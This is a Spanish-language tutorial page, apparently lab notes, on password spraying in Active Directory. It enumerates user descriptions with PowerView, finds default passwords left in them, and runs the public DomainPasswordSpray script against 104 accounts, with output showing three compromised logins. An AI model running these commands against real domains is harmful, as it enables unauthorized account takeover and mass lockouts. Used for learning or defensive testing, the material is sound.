---
icon: sprinkler
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Password Spraying

Esta tecnica consiste en ser capaces de coger una contraseña y propagarla por todos los usuarios del dominio para saber que usuarios coinciden y tienen esa contraseña asociada, pero es una tecnica muy intrusiva y en entornos reales se hay llegado a utilizar por equipos de `Red Team` y han llegado a bloquear todas las cuentas de usuarios ya que dependiendo de como este configurado tendra un numero limitado de intentos.

Primero para poder identificar alguna contraseña podremos ver las descripciones que en algunos casos puede ser muy importante para poder ver si alguno se dejo la ocntraseña puesta en la descripcion y realizar la tecnica.

```powershell
cd .\Desktop
. .\new_powerview.ps1
Get-NetUser | select name,description
```

Info:

```
name              description
----              -----------
Administrator     Built-in account for administering the computer/domain
Guest             Built-in account for guest access to the computer/domain
krbtgt            Key Distribution Center Service Account
empleado1
empleado2
Maurine Bibby
Henrie Kaleena
Ali Alix
Saree Dayna
Lonnie Betti      Replication Account
Abbi Jocelyn
Arlie Gunilla
Adorne Bridgette  Shared User
Roanna Bidget
Aubry Carolan
Ermina Hatti
Angelika Shelly   Replication Account
Barby Min
Jannel Emalia
Audre Maible
Kizzie Kacy
Andreana Shea
Emeline Shirline
Brynne Kenon
Myrtia Agatha
Ernaline Lowell
Gerri Kathi
Goldarina Nicki
Avril Cheri
Bobette Glenn
Joanie Karine
Gwenneth Gilly
Saidee Kaye
Cynthie Rori      Replication Account
Cristabel Melony
Mela Jacquetta
Jennifer Gerry    Shared User
Ginevra Michel
Arabella Norry
Colly Katey
Marsha Jordan
Britni Henrieta
Alejandrina Faye
Philis Bertha
Harriett Daron
Ardine Farra
Robena Prudence
Pearl Judye
Riva Nellie
Jobina Aleta
Fayina Hyacinth
Loretta Jerrine
Peta Adelind
Ophelie Odele
Cybil Alica
Shay Siana
Halette Martelle
Audrey Hedwiga
Betsey Stephine
Demetris Daveta
Lexy Rosaline
Ilyssa Nevsa
Denice Freda
Georgia Marie-Ann
Benny Alikee
Sandye Leodora
Germain Gavrielle Shared User
Milicent Gracie
Meg Carolee
Linn Evaleen
Mirna Annice
Diana Sharai
Deeann Amalita
Kettie Shanta
Estelle Kelli
Guenna Jessi      Shared User
Allissa Lezlie
Crissie Deena
Olga Rhoda
Anna Costanza
Corie Josie       New User ,DefaultPassword (password)
Evy Britta
Jaime Luise
Gennifer Cleo
Colly Elfie
Gill Kellie
Carmon Leoine
Farrand Inna
Donnie Lari
Millie Hanny
Sarita Alisha
Rycca Jacinta
Levin Bab
Celle Sherye      New User ,DefaultPassword (password)
Chloris Ilysa
Kelley Happy
Darsey Jasmine
Ebba Nicoline
Geneva Lorrin
Joellyn Pippa
Renelle Jacynth
Sarah Rhoda
Annice Mable      My password is Passw0rd5
Aimil Evangelia   Shared User
```

Por lo que vemos, estamos viendo a 2 usuarios bastante interesantes que dicen tener la contraseña por defecto y esta misma esta entre parentesis (`password`).

Por lo que vamos a utilizar un script publico de un repositorio de `GitHub` para realizar esta tecnica que estara en el siguiente link:

URL = [DomainPasswordSpray GitHub](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)

Copiaremos el script y lo pegaremos en un archivo del equipo de `empleado1` llamado `passwordspray.ps1`.

Una vez realizado todo eso en el `PowerShell` pondremos lo siguiente.

```powershell
. .\passwordspray.ps1
```

Con esto ya habremos cargado el script.

> NOTA

En tal caso de que diera un error puede ser por la linea `261` la cual habra que comentar de la siguiente forma:

```powershell
# Write-Host "${Message}: Waiting for $($Seconds/60) minutes. $($Seconds - $Count)"
```

Y lo volveremos a ejecutar.

Una vez cargado el script, tendremos que hacer lo siguiente para realizar la tecnica, pero antes tendremos que generar el archivo de usuarios para poder utilizarla para la tecnica de la siguiente forma.

```powershell
Get-NetUser | Select-Object -ExpandProperty name | Out-File C:\Users\empleado1\Desktop\users.txt
```

Esto nos habara generado un archivo en el escritorio algo asi:

<figure><img src="../../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

Y ahora vamos a probar como vimos anteriormente si alguno mas de esos 2 usuarios tiene la contraseña por defecto llamada `password`:

```powershell
Invoke-DomainPasswordSpray -UserList .\users.txt -Password "password"
```

Info:

```
[*] Using .\users.txt as userlist to spray with
[*] Warning: Users will not be checked for lockout threshold.
[*] The domain password policy observation window is set to 1 minutes.
[*] Setting a 1 minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 104 accounts?
[Y] Yes  [N] No  [?] Ayuda (el valor predeterminado es "Y"):
[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password password against 104 users. Current time is 8:11
[*] SUCCESS! User:ernaline.lowell Password:password
[*] SUCCESS! User:corie.josie Password:password
[*] SUCCESS! User:celle.sherye Password:password
[*] Password spraying is complete
```

Y vemos que nos esta sacando las contraseñas de dichos usuarios, pero si lo probamos muchas veces puede ser que bloqueemos las cuentas de usuarios ya que los que no estan coincidiendo tengan un limite de intentos y se bloqueen por lo que hay que tener mucho cuidado con esto.
